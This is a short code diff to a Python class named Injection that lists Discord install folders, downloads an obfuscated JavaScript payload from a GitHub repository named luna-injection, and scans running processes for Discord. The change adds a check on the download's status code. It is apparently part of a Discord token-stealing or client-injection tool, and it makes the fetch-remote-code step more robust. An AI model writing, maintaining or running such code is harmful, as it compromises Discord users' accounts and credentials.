@@ -863,7 +863,10 @@ class Injection:
             self.appdata + '\\DiscordPTB',
             self.appdata + '\\DiscordDevelopment'
         ]
-        self.code = requests.get('https://raw.githubusercontent.com/Smug246/luna-injection/main/obfuscated-injection.js').text
+        response = requests.get('https://raw.githubusercontent.com/Smug246/luna-injection/main/obfuscated-injection.js')
+        if response.status_code != 200:
+            return
+        self.code = response.text
 
         for proc in psutil.process_iter():
             if 'discord' in proc.name().lower():
